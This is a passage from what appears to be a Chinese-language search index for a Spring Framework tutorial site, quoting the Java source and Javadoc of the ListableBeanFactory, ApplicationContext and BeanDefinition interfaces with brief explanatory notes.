hierarchy this factory may participate in,\n     * and ignores any singleton beans that have been registered by\n     * other means than bean definitions.\n     * @return the names of all beans defined in this factory,\n     * or an empty array if none defined\n     */\n    String[] getBeanDefinitionNames();\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans, which means that FactoryBeans\n     * will get initialized. If the object created by the FactoryBean doesn't match,\n     * the raw FactoryBean itself will be matched against the type.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;This version of {@code getBeanNamesForType} matches all kinds of beans,\n     * be it singletons, prototypes, or FactoryBeans. In most implementations, the\n     * result will be the same as for {@code getBeanNamesForType(type, true, true)}.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the generically typed class or interface to match\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @since 4.2\n     * @see #isTypeMatch(String, ResolvableType)\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, ResolvableType)\n     */\n    String[] getBeanNamesForType(ResolvableType type);\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans if the \"allowEagerInit\" flag is set,\n     * which means that FactoryBeans will get initialized. If the object created by the\n     * FactoryBean doesn't match, the raw FactoryBean itself will be matched against the\n     * type. If \"allowEagerInit\" is not set, only raw FactoryBeans will be checked\n     * (which doesn't require initialization of each FactoryBean).\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the generically typed class or interface to match\n     * @param includeNonSingletons whether to include prototype or scoped beans too\n     * or just singletons (also applies to FactoryBeans)\n     * @param allowEagerInit whether to initialize &lt;i&gt;lazy-init singletons&lt;/i&gt; and\n     * &lt;i&gt;objects created by FactoryBeans&lt;/i&gt; (or by factory methods with a\n     * \"factory-bean\" reference) for the type check. Note that FactoryBeans need to be\n     * eagerly initialized to determine their type: So be aware that passing in \"true\"\n     * for this flag will initialize FactoryBeans and \"factory-bean\" references.\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @since 5.2\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, ResolvableType, boolean, boolean)\n     */\n    String[] getBeanNamesForType(ResolvableType type, boolean includeNonSingletons, boolean allowEagerInit);\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans, which means that FactoryBeans\n     * will get initialized. If the object created by the FactoryBean doesn't match,\n     * the raw FactoryBean itself will be matched against the type.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;This version of {@code getBeanNamesForType} matches all kinds of beans,\n     * be it singletons, prototypes, or FactoryBeans. In most implementations, the\n     * result will be the same as for {@code getBeanNamesForType(type, true, true)}.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all bean names\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, Class)\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type);\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans if the \"allowEagerInit\" flag is set,\n     * which means that FactoryBeans will get initialized. If the object created by the\n     * FactoryBean doesn't match, the raw FactoryBean itself will be matched against the\n     * type. If \"allowEagerInit\" is not set, only raw FactoryBeans will be checked\n     * (which doesn't require initialization of each FactoryBean).\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all bean names\n     * @param includeNonSingletons whether to include prototype or scoped beans too\n     * or just singletons (also applies to FactoryBeans)\n     * @param allowEagerInit whether to initialize &lt;i&gt;lazy-init singletons&lt;/i&gt; and\n     * &lt;i&gt;objects created by FactoryBeans&lt;/i&gt; (or by factory methods with a\n     * \"factory-bean\" reference) for the type check. Note that FactoryBeans need to be\n     * eagerly initialized to determine their type: So be aware that passing in \"true\"\n     * for this flag will initialize FactoryBeans and \"factory-bean\" references.\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, Class, boolean, boolean)\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type, boolean includeNonSingletons, boolean allowEagerInit);\n\n    /**\n     * Return the bean instances that match the given object type (including\n     * subclasses), judging from either bean definitions or the value of\n     * {@code getObjectType} in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans, which means that FactoryBeans\n     * will get initialized. If the object created by the FactoryBean doesn't match,\n     * the raw FactoryBean itself will be matched against the type.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beansOfTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;This version of getBeansOfType matches all kinds of beans, be it\n     * singletons, prototypes, or FactoryBeans. In most implementations, the\n     * result will be the same as for {@code getBeansOfType(type, true, true)}.\n     * &lt;p&gt;The Map returned by this method should always return bean names and\n     * corresponding bean instances &lt;i&gt;in the order of definition&lt;/i&gt; in the\n     * backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all concrete beans\n     * @return a Map with the matching beans, containing the bean names as\n     * keys and the corresponding bean instances as values\n     * @throws BeansException if a bean could not be created\n     * @since 1.1.2\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beansOfTypeIncludingAncestors(ListableBeanFactory, Class)\n     */\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type) throws BeansException;\n\n    /**\n     * Return the bean instances that match the given object type (including\n     * subclasses), judging from either bean definitions or the value of\n     * {@code getObjectType} in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans if the \"allowEagerInit\" flag is set,\n     * which means that FactoryBeans will get initialized. If the object created by the\n     * FactoryBean doesn't match, the raw FactoryBean itself will be matched against the\n     * type. If \"allowEagerInit\" is not set, only raw FactoryBeans will be checked\n     * (which doesn't require initialization of each FactoryBean).\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beansOfTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;The Map returned by this method should always return bean names and\n     * corresponding bean instances &lt;i&gt;in the order of definition&lt;/i&gt; in the\n     * backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all concrete beans\n     * @param includeNonSingletons whether to include prototype or scoped beans too\n     * or just singletons (also applies to FactoryBeans)\n     * @param allowEagerInit whether to initialize &lt;i&gt;lazy-init singletons&lt;/i&gt; and\n     * &lt;i&gt;objects created by FactoryBeans&lt;/i&gt; (or by factory methods with a\n     * \"factory-bean\" reference) for the type check. Note that FactoryBeans need to be\n     * eagerly initialized to determine their type: So be aware that passing in \"true\"\n     * for this flag will initialize FactoryBeans and \"factory-bean\" references.\n     * @return a Map with the matching beans, containing the bean names as\n     * keys and the corresponding bean instances as values\n     * @throws BeansException if a bean could not be created\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beansOfTypeIncludingAncestors(ListableBeanFactory, Class, boolean, boolean)\n     */\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type, boolean includeNonSingletons, boolean allowEagerInit)\n            throws BeansException;\n\n    /**\n     * Find all names of beans which are annotated with the supplied {@link Annotation}\n     * type, without creating corresponding bean instances yet.\n     * &lt;p&gt;Note that this method considers objects created by FactoryBeans, which means\n     * that FactoryBeans will get initialized in order to determine their object type.\n     * @param annotationType the type of annotation to look for\n     * (at class, interface or factory method level of the specified bean)\n     * @return the names of all matching beans\n     * @since 4.0\n     * @see #findAnnotationOnBean\n     */\n    String[] getBeanNamesForAnnotation(Class&lt;? extends Annotation&gt; annotationType);\n\n    /**\n     * Find all beans which are annotated with the supplied {@link Annotation} type,\n     * returning a Map of bean names with corresponding bean instances.\n     * &lt;p&gt;Note that this method considers objects created by FactoryBeans, which means\n     * that FactoryBeans will get initialized in order to determine their object type.\n     * @param annotationType the type of annotation to look for\n     * (at class, interface or factory method level of the specified bean)\n     * @return a Map with the matching beans, containing the bean names as\n     * keys and the corresponding bean instances as values\n     * @throws BeansException if a bean could not be created\n     * @since 3.0\n     * @see #findAnnotationOnBean\n     */\n    Map&lt;String, Object&gt; getBeansWithAnnotation(Class&lt;? extends Annotation&gt; annotationType) throws BeansException;\n\n    /**\n     * Find an {@link Annotation} of {@code annotationType} on the specified bean,\n     * traversing its interfaces and super classes if no annotation can be found on\n     * the given class itself, as well as checking the bean's factory method (if any).\n     * @param beanName the name of the bean to look for annotations on\n     * @param annotationType the type of annotation to look for\n     * (at class, interface or factory method level of the specified bean)\n     * @return the annotation of the given type if found, or {@code null} otherwise\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 3.0\n     * @see #getBeanNamesForAnnotation\n     * @see #getBeansWithAnnotation\n     */\n    @Nullable\n    &lt;A extends Annotation&gt; A findAnnotationOnBean(String beanName, Class&lt;A&gt; annotationType)\n            throws NoSuchBeanDefinitionException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#listablebeanfactory","title":"ListableBeanFactory\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface ListableBeanFactory extends BeanFactory {\n\n    /**\n     */\n    boolean containsBeanDefinition(String beanName);\n\n    /**\n     */\n    int getBeanDefinitionCount();\n\n    /**\n     */\n    String[] getBeanDefinitionNames();\n\n    /**\n     */\n    String[] getBeanNamesForType(ResolvableType type);\n\n    /**\n     */\n    String[] getBeanNamesForType(ResolvableType type, boolean includeNonSingletons, boolean allowEagerInit);\n\n    /**\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type);\n\n    /**\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type, boolean includeNonSingletons, boolean allowEagerInit);\n\n\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type) throws BeansException;\n\n\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type, boolean includeNonSingletons, boolean allowEagerInit)\n            throws BeansException;\n\n\n    String[] getBeanNamesForAnnotation(Class&lt;? extends Annotation&gt; annotationType);\n\n\n    Map&lt;String, Object&gt; getBeansWithAnnotation(Class&lt;? extends Annotation&gt; annotationType) throws BeansException;\n\n\n    @Nullable\n    &lt;A extends Annotation&gt; A findAnnotationOnBean(String beanName, Class&lt;A&gt; annotationType)\n            throws NoSuchBeanDefinitionException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#14-applicationcontext","title":"1.4 ApplicationContext\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#applicationcontext","title":"ApplicationContext\u200b\u63a5\u53e3\u200b\u89e3\u6790","text":"<ul> <li>\u200b\u76f8\u6bd4\u200b\u4e8e\u200bBeanFactory,ApplicationContext\u200b\u662f\u200b\u9ad8\u200b\u914d\u7248\u200b\u7684\u200bIoc\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5176\u200b\u5728\u200bBeanFactory\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u7684\u200b\u6269\u5c55\u200b\u529f\u80fd\u200b</li> <li>ListableBeanFactory, HierarchicalBeanFactory\u200b\u90fd\u200b\u662f\u200bBeanFactory\u200b\u7684\u200b\u5b50\u200b\u63a5\u53e3\u200b\uff0cApplicationContext\u200b\u7ee7\u627f\u200b\u4e86\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u63a5\u53e3\u200b\uff0cApplicationContext\u200b\u8fdb\u4e00\u6b65\u200b\u6269\u5c55\u200b\u4e86\u200bBeanFactory\u200b\u63a5\u53e3\u200b\u7684\u200b\u529f\u80fd\u200b</li> <li>. . .</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_5","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2014 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.context;\n\nimport org.springframework.beans.factory.HierarchicalBeanFactory;\nimport org.springframework.beans.factory.ListableBeanFactory;\nimport org.springframework.beans.factory.config.AutowireCapableBeanFactory;\nimport org.springframework.core.env.EnvironmentCapable;\nimport org.springframework.core.io.support.ResourcePatternResolver;\nimport org.springframework.lang.Nullable;\n\n/**\n * Central interface to provide configuration for an application.\n * This is read-only while the application is running, but may be\n * reloaded if the implementation supports this.\n *\n * &lt;p&gt;An ApplicationContext provides:\n * &lt;ul&gt;\n * &lt;li&gt;Bean factory methods for accessing application components.\n * Inherited from {@link org.springframework.beans.factory.ListableBeanFactory}.\n * &lt;li&gt;The ability to load file resources in a generic fashion.\n * Inherited from the {@link org.springframework.core.io.ResourceLoader} interface.\n * &lt;li&gt;The ability to publish events to registered listeners.\n * Inherited from the {@link ApplicationEventPublisher} interface.\n * &lt;li&gt;The ability to resolve messages, supporting internationalization.\n * Inherited from the {@link MessageSource} interface.\n * &lt;li&gt;Inheritance from a parent context. Definitions in a descendant context\n * will always take priority. This means, for example, that a single parent\n * context can be used by an entire web application, while each servlet has\n * its own child context that is independent of that of any other servlet.\n * &lt;/ul&gt;\n *\n * &lt;p&gt;In addition to standard {@link org.springframework.beans.factory.BeanFactory}\n * lifecycle capabilities, ApplicationContext implementations detect and invoke\n * {@link ApplicationContextAware} beans as well as {@link ResourceLoaderAware},\n * {@link ApplicationEventPublisherAware} and {@link MessageSourceAware} beans.\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @see ConfigurableApplicationContext\n * @see org.springframework.beans.factory.BeanFactory\n * @see org.springframework.core.io.ResourceLoader\n */\npublic interface ApplicationContext extends EnvironmentCapable, ListableBeanFactory, HierarchicalBeanFactory,\n        MessageSource, ApplicationEventPublisher, ResourcePatternResolver {\n\n    /**\n     * Return the unique id of this application context.\n     * @return the unique id of the context, or {@code null} if none\n     */\n    @Nullable\n    String getId();\n\n    /**\n     * Return a name for the deployed application that this context belongs to.\n     * @return a name for the deployed application, or the empty String by default\n     */\n    String getApplicationName();\n\n    /**\n     * Return a friendly name for this context.\n     * @return a display name for this context (never {@code null})\n     */\n    String getDisplayName();\n\n    /**\n     * Return the timestamp when this context was first loaded.\n     * @return the timestamp (ms) when this context was first loaded\n     */\n    long getStartupDate();\n\n    /**\n     * Return the parent context, or {@code null} if there is no parent\n     * and this is the root of the context hierarchy.\n     * @return the parent context, or {@code null} if there is no parent\n     */\n    @Nullable\n    ApplicationContext getParent();\n\n    /**\n     * Expose AutowireCapableBeanFactory functionality for this context.\n     * &lt;p&gt;This is not typically used by application code, except for the purpose of\n     * initializing bean instances that live outside of the application context,\n     * applying the Spring bean lifecycle (fully or partly) to them.\n     * &lt;p&gt;Alternatively, the internal BeanFactory exposed by the\n     * {@link ConfigurableApplicationContext} interface offers access to the\n     * {@link AutowireCapableBeanFactory} interface too. The present method mainly\n     * serves as a convenient, specific facility on the ApplicationContext interface.\n     * &lt;p&gt;&lt;b&gt;NOTE: As of 4.2, this method will consistently throw IllegalStateException\n     * after the application context has been closed.&lt;/b&gt; In current Spring Framework\n     * versions, only refreshable application contexts behave that way; as of 4.2,\n     * all application context implementations will be required to comply.\n     * @return the AutowireCapableBeanFactory for this context\n     * @throws IllegalStateException if the context does not support the\n     * {@link AutowireCapableBeanFactory} interface, or does not hold an\n     * autowire-capable bean factory yet (e.g. if {@code refresh()} has\n     * never been called), or if the context has been closed already\n     * @see ConfigurableApplicationContext#refresh()\n     * @see ConfigurableApplicationContext#getBeanFactory()\n     */\n    AutowireCapableBeanFactory getAutowireCapableBeanFactory() throws IllegalStateException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#applicationcontext_1","title":"ApplicationContext\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface ApplicationContext extends EnvironmentCapable, ListableBeanFactory, HierarchicalBeanFactory,\n        MessageSource, ApplicationEventPublisher, ResourcePatternResolver {\n\n    @Nullable\n    String getId();\n\n\n    String getApplicationName();\n\n\n    String getDisplayName();\n\n\n    long getStartupDate();\n\n\n    @Nullable\n    ApplicationContext getParent();\n\n    AutowireCapableBeanFactory getAutowireCapableBeanFactory() throws IllegalStateException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#15-beandefination","title":"1.5 BeanDefination\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#beandefination","title":"BeanDefination\u200b\u63a5\u53e3\u5b9a\u4e49\u200b\u89e3\u6790","text":"<ul> <li>BeanDefination\u200b\u7528\u4e8e\u200b\u7ba1\u7406\u200bIoc\u200b\u5bb9\u5668\u200b\u4e2d\u200bJavaBean\u200b\u4e0e\u200bJavaBean\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u5176\u200b\u62bd\u8c61\u200b\u4e86\u200bJava\u200b\u5f00\u53d1\u4eba\u5458\u200b\u5bf9\u4e8e\u200bJavaBean\u200b\u7684\u200b\u5b9a\u4e49\u200b</li> <li>Spring\u200b\u5c06\u200b\u5f00\u53d1\u4eba\u5458\u200b\u5b9a\u4e49\u200b\u7684\u200bJavaBean\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200bBeanDefination\u200b\u6570\u636e\u7ed3\u6784\u200b\u8fdb\u884c\u200b\u7ef4\u62a4\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_6","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2019 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory.config;\n\nimport org.springframework.beans.BeanMetadataElement;\nimport org.springframework.beans.MutablePropertyValues;\nimport org.springframework.core.AttributeAccessor;\nimport org.springframework.core.ResolvableType;\nimport org.springframework.lang.Nullable;\n\n/**\n * A BeanDefinition describes a bean instance, which has property values,\n * constructor argument values, and further information supplied by\n * concrete implementations.\n *\n * &lt;p&gt;This is just a minimal interface: The main intention is to allow a\n * {@link BeanFactoryPostProcessor} to introspect and modify property values\n * and other bean metadata.\n *\n * @author Juergen Hoeller\n * @author Rob Harrop\n * @since 19.03.2004\n * @see ConfigurableListableBeanFactory#getBeanDefinition\n * @see org.springframework.beans.factory.support.RootBeanDefinition\n * @see org.springframework.beans.factory.support.ChildBeanDefinition\n */\npublic interface BeanDefinition extends AttributeAccessor, BeanMetadataElement {\n\n    /**\n     * Scope identifier for the standard singleton scope: \"singleton\".\n     * &lt;p&gt;Note that extended bean factories might support further scopes.\n     * @see #setScope\n     */\n    String SCOPE_SINGLETON = ConfigurableBeanFactory.SCOPE_SINGLETON;\n\n    /**\n     * Scope identifier for the standard prototype scope: \"prototype\".\n     * &lt;p&gt;Note that extended bean factories might support further scopes.\n     * @see #setScope\n     */\n    String SCOPE_PROTOTYPE = ConfigurableBeanFactory.SCOPE_PROTOTYPE;\n\n\n    /**\n     * Role hint indicating that a {@code BeanDefinition} is a major part\n     * of the application. Typically corresponds to a user-defined bean.\n     */\n    int ROLE_APPLICATION = 0;\n\n    /**\n     * Role hint indicating that a {@code BeanDefinition} is a supporting\n     * part of some larger configuration, typically an outer\n     * {@link org.springframework.beans.factory.parsing.ComponentDefinition}.\n     * {@code SUPPORT} beans are considered important enough to be aware\n     * of when looking more closely at a particular\n     * {@link org.springframework.beans.factory.parsing.ComponentDefinition},\n     * but not when looking at the overall configuration of an application.\n     */\n    int ROLE_SUPPORT = 1;\n\n    /**\n     * Role hint indicating that a {@code BeanDefinition} is providing an\n     * entirely background role and has no relevance to the end-user. This hint is\n     * used when registering beans that are completely part of the internal workings\n     * of a {@link org.springframework.beans.factory.parsing.ComponentDefinition}.\n     */\n    int ROLE_INFRASTRUCTURE = 2;\n\n\n    // Modifiable attributes\n\n    /**\n     * Set the name of the parent definition of this bean definition, if any.\n     */\n    void setParentName(@Nullable String parentName);\n\n    /**\n     * Return the name of the parent definition of this bean definition, if any.\n     */\n    @Nullable\n    String getParentName();\n\n    /**\n     * Specify the bean class name of this bean definition.\n     * &lt;p&gt;The class name can be modified during bean factory post-processing,\n     * typically replacing the original class name with a parsed variant of it.\n     * @see #setParentName\n     * @see #setFactoryBeanName\n     * @see #setFactoryMethodName\n     */\n    void setBeanClassName(@Nullable String beanClassName);\n\n    /**\n     * Return the current bean class name of this bean definition.\n     * &lt;p&gt;Note that this does not have to be the actual class name used at runtime, in\n     * case of a child definition overriding/inheriting the class name from its parent.\n     * Also, this may just be the class that a factory method is called on, or it may\n     * even be empty in case of a factory bean reference that a method is called on.\n     * Hence, do &lt;i&gt;not&lt;/i&gt; consider this to be the definitive bean type at runtime but\n     * rather only use it for parsing purposes at the individual bean definition level.\n     * @see #getParentName()\n     * @see #getFactoryBeanName()\n     * @see #getFactoryMethodName()\n     */\n    @Nullable\n    String getBeanClassName();\n\n    /**\n     * Override the target scope of this bean, specifying a new scope name.\n     * @see #SCOPE_SINGLETON\n     * @see #SCOPE_PROTOTYPE\n     */\n    void setScope(@Nullable String scope);\n\n    /**\n     * Return the name of the current target scope for this bean,\n     * or {@code null} if not known yet.\n     */\n    @Nullable\n    String getScope();\n\n    /**\n     * Set whether this bean should be lazily initialized.\n     * &lt;p&gt;If {@code false}, the bean will get instantiated on startup by bean\n     * factories that perform eager initialization of singletons.\n     */\n    void setLazyInit(boolean lazyInit);\n\n    /**\n     * Return whether this bean should be lazily initialized, i.e. not\n     * eagerly instantiated on startup. Only applicable to a singleton bean.\n     */\n    boolean isLazyInit();\n\n    /**\n     * Set the names of the beans that this bean depends on being initialized.\n     * The bean factory will guarantee that these beans get initialized first.\n     */\n    void setDependsOn(@Nullable String... dependsOn);\n\n    /**\n     * Return the bean names that this bean depends on.\n     */\n    @Nullable\n    String[] getDependsOn();\n\n    /**\n     * Set whether this bean is a candidate for getting autowired into some other bean.\n     * &lt;p&gt;Note that this flag is designed to only affect type-based autowiring.\n     * It does not affect explicit references by name, which will get resolved even\n     * if the specified bean is not marked as an autowire candidate. As a consequence,\n     * autowiring by name will nevertheless inject a bean if the name matches.\n     */\n    void setAutowireCandidate(boolean autowireCandidate);\n\n    /**\n     * Return whether this bean is a candidate for getting autowired into some other bean.\n     */\n    boolean isAutowireCandidate();\n\n    /**\n     * Set whether this bean is a primary autowire candidate.\n     * &lt;p&gt;If this value is {@code true} for exactly one bean among multiple\n     * matching candidates, it will serve as a tie-breaker.\n     */\n    void setPrimary(boolean primary);\n\n    /**\n     * Return whether this bean is a primary autowire candidate.\n     */\n    boolean isPrimary();\n\n    /**\n     * Specify the factory bean to use, if any.\n     * This the name of the bean to call the specified factory method on.\n     * @see #setFactoryMethodName\n     */\n    void setFactoryBeanName(@Nullable String factoryBeanName);\n\n    /**\n     * Return the factory bean name, if any.\n     */\n    @Nullable\n    String getFactoryBeanName();\n\n    /**\n     * Specify a factory method, if any. This method will be invoked with\n     * constructor arguments, or with no arguments if none are specified.\n     * The method will be invoked on the specified factory bean, if any,\n     * or otherwise as a static method on the local bean class.\n     * @see #setFactoryBeanName\n     * @see #setBeanClassName\n     */\n    void setFactoryMethodName(@Nullable String factoryMethodName);\n\n    /**\n     * Return a factory method, if any.\n     */\n    @Nullable\n    String getFactoryMethodName();\n\n    /**\n     * Return the constructor argument values for this bean.\n     * &lt;p&gt;The returned instance can be modified during bean factory post-processing.\n     * @return the ConstructorArgumentValues object (never {@code null})\n     */\n    ConstructorArgumentValues getConstructorArgumentValues();\n\n    /**\n     * Return if there are constructor argument values defined for this bean.\n     * @since 5.0.2\n     */\n    default boolean hasConstructorArgumentValues() {\n        return !getConstructorArgumentValues().isEmpty();\n    }\n\n    /**\n     * Return the property values to be applied to a new instance of the bean.\n     * &lt;p&gt;The returned instance can be modified during bean factory post-processing.\n     * @return the MutablePropertyValues object (never {@code null})\n     */\n    MutablePropertyValues getPropertyValues();\n\n    /**\n     * Return if there are property values values defined for this bean.\n     * @since 5.0.2\n     */\n    default boolean hasPropertyValues() {\n        return !getPropertyValues().isEmpty();\n    }\n\n    /**\n     * Set the name of the initializer method.\n     * @since 5.1\n     */\n    void setInitMethodName(@Nullable String initMethodName);\n\n    /**\n     * Return the name of the initializer method.\n     * @since 5.1\n     */\n    @Nullable\n    String getInitMethodName();\n\n    /**\n     * Set the name of the destroy method.\n     * @since 5.1\n     */\n    void setDestroyMethodName(@Nullable String destroyMethodName);\n\n    /**\n     * Return the name of the destroy method.\n     * @since 5.1\n     */\n    @Nullable\n    String getDestroyMethodName();\n\n    /**\n     * Set the role hint for this {@code BeanDefinition}. The role hint\n     * provides the frameworks as well as tools with an indication of\n     * the role and importance of a particular {@code BeanDefinition}.\n     * @since 5.1\n     * @see #ROLE_APPLICATION\n     * @see 